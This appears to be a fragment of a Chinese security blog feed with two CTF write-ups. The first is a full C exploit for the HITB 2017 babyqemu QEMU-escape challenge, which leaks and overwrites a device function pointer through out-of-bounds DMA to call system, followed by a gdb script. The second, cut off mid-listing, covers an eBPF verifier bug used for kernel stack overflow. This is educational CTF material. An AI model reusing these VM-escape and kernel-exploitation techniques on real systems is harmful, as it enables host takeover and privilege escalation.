class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DMABASE 0x40000</span></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_src</span><span class="params">(<span class="keyword">uint32_t</span> src_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>, src_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_dst</span><span class="params">(<span class="keyword">uint32_t</span> dst_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>, dst_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_set_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_cmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(userbuf, buf, len);</span><br><span class="line"></span><br><span class="line">    dma_set_src(phy_userbuf);</span><br><span class="line">    dma_set_dst(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line">    dma_do_cmd(<span class="number">0</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_read</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dma_set_dst(phy_userbuf);</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">2</span> | <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dma_do_enc</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dma_set_src(addr);</span><br><span class="line">    dma_set_cnt(len);</span><br><span class="line"></span><br><span class="line">    dma_do_cmd(<span class="number">1</span> | <span class="number">4</span> | <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf = va2pa(userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff virtual address: %p\n&quot;</span>, userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user buff physical address: %p\n&quot;</span>, (<span class="keyword">void</span> *)phy_userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to leak enc ptr</span></span><br><span class="line">    dma_do_read(<span class="number">0x1000</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> leak_enc = *(<span class="keyword">uint64_t</span> *)userbuf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaking enc function: %p\n&quot;</span>, (<span class="keyword">void</span> *)leak_enc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> pro_base = leak_enc - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = pro_base + <span class="number">0x1FDB18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// out of bound to overwrite enc ptr to system ptr</span></span><br><span class="line">    dma_do_write(<span class="number">0x1000</span> + DMABASE, &amp;system_plt, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deply the parameter of system function</span></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;cat flag\x00&quot;</span>;</span><br><span class="line">    dma_do_write(<span class="number">0x200</span> + DMABASE, command, <span class="built_in">strlen</span>(command));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger the enc ptr to execute system</span></span><br><span class="line">    dma_do_enc(<span class="number">0x200</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205170230132.png"                      alt="image-20230205170230132"                ></p><p>调试脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pid=`ps -aux | grep <span class="string">&quot;qemu-system-x86_64&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">sudo gdb \</span><br><span class="line">-ex <span class="string">&quot;file qemu-system-x86_64&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;attach <span class="variable">$pid</span>&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;b*\$rebase(0x284191)&quot;</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230205173312988.png"                      alt="image-20230205173312988"                ></p><hr><p>题目地址：<a class="link"   href="https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz" >https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz<i class="fas fa-external-link-alt"></i></a></p><p>参考链接：</p><p><a class="link"   href="https://www.anquanke.com/post/id/224199#h3-5" >https://www.anquanke.com/post/id/224199#h3-5<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio" >https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。&lt;/p&gt;
&lt;p&gt;在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>d3bpf-v2</title>
    <link href="https://cv196082.gitee.io/2023/01/11/d3bpf-v2/"/>
    <id>https://cv196082.gitee.io/2023/01/11/d3bpf-v2/</id>
    <published>2023-01-11T10:09:05.000Z</published>
    <updated>2023-01-11T10:11:17.190Z</updated>
    
    <content type="html"><![CDATA[<p>因为近期一直在玩内核，在把这篇文章写完之后就不会一直更新内核相关的了，后续的打算是学习完逃逸的内容之后就开始进行刷题和复现比赛的练习了。</p><h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>首先，这道题的大致跟上一道题目一样，存在一个patch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index <span class="number">40</span>d92628e..be9cdde7a <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-8100</span>,<span class="number">11</span> +<span class="number">8100</span>,<span class="number">11</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function"> scalar_min_max_lsh(dst_reg, &amp;src_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">case</span> BPF_RSH:</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="keyword">if</span> (umax_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">-<span class="comment">/* Shifts greater than 31 or 63 are undefined.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- * This includes shifts by a negative number.</span></span></span></span><br><span class="line"><span class="comment"><span class="params"><span class="function">- */</span></span></span></span><br><span class="line"><span class="params"><span class="function">-mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (umin_val &gt;= insn_bitness) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg32_known(dst_reg, <span class="number">0</span>);</span></span></span><br><span class="line"><span class="params"><span class="function">+<span class="keyword">else</span></span></span></span><br><span class="line"><span class="params"><span class="function">+__mark_reg_known_zero(dst_reg);</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"> &#125;</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">if</span> (alu32)</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br></pre></td></tr></table></figure><p>可以看出来这里的patch跟前面一道题一样，在RSH中设置了超过指定大小的数时会设置为known的0。</p><p>不同的是这里题目使用的内核版本是5.16.12+，而在新版本的内核中存在新的检测机制：</p><ul><li>  任何指针只能进行加减操作，不能进行比较（防止侧信道）</li><li>  在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。</li></ul><p>所以这也就造成了前面的攻击手法无效了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>这里出现了一个新的函数<code>bpf_skb_load_bytes</code>可以进行绕过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">BPF_CALL_4(bpf_skb_load_bytes, <span class="keyword">const</span> struct sk_buff *, skb, u32, offset,</span><br><span class="line">   <span class="keyword">void</span> *, to, u32, len)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(offset &gt; <span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"></span><br><span class="line">ptr = skb_header_pointer(skb, offset, len, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!ptr))</span><br><span class="line"><span class="keyword">goto</span> err_clear;</span><br><span class="line"><span class="keyword">if</span> (ptr != to)</span><br><span class="line"><span class="built_in">memcpy</span>(to, ptr, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_clear:</span><br><span class="line"><span class="built_in">memset</span>(to, <span class="number">0</span>, len);</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用是读取socket缓冲区到指定的位置，在ebpf程序中可以是栈或者map。</p><p>然而因为patch的缘故我们可以很轻松的实现栈溢出。</p><h3 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h3><p>这里leak的方法延用作者的方法。</p><p>在新版本内核中ebpf程序crash并不会造成内核的崩溃，当<code>/proc/sys/kernel/panic_on_oops</code> 值为 0 时 <code>soft panic</code> 并不会直接 panic。似乎在默认情况下其值就是 0，如 Ubuntu20.04。而在kernel pwn题目中想出现上述情况的方法是在qemu启动项中添加<code> oops = panic</code>。而在发生<code>soft panic</code>时会打印出来内核地址。所以这里选择这样使用，使ebpf程序出现crash紧接着就会打印出地址即可。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里因为可以很简单的进行栈溢出所以就不多赘述了。所以直接给出exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span 